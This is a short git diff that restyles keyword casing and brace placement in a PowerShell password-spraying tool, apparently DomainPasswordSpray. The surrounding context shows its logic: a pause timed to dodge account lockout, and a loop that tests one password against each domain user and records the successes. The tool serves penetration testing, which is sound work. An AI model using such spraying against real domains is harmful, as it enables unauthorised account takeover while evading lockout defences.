@@ -195,20 +195,20 @@ function Invoke-DomainPasswordSpray{
     }
 }
 
-Function Countdown-Timer
+function Countdown-Timer
 {
     param(
         $Seconds = 1800,
         $Message = "[*] Pausing to avoid account lockout."
     )
-    ForEach ($Count in (1..$Seconds))
+    foreach ($Count in (1..$Seconds))
     {   Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
         Start-Sleep -Seconds 1
     }
     Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
 }
 
-Function Get-DomainUserList{
+function Get-DomainUserList{
 
 <#
     .SYNOPSIS
@@ -434,7 +434,8 @@ function Invoke-SpraySinglePassword($CurrentDomain, $UserListArray, $Password)
     $curr_user = 0
     Write-Host -ForegroundColor Yellow "[*] Writing successes to $OutFile"
 
-    ForEach($User in $UserListArray){
+    foreach ($User in $UserListArray)
+    {
         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
         if ($Domain_check.name -ne $null)
         {
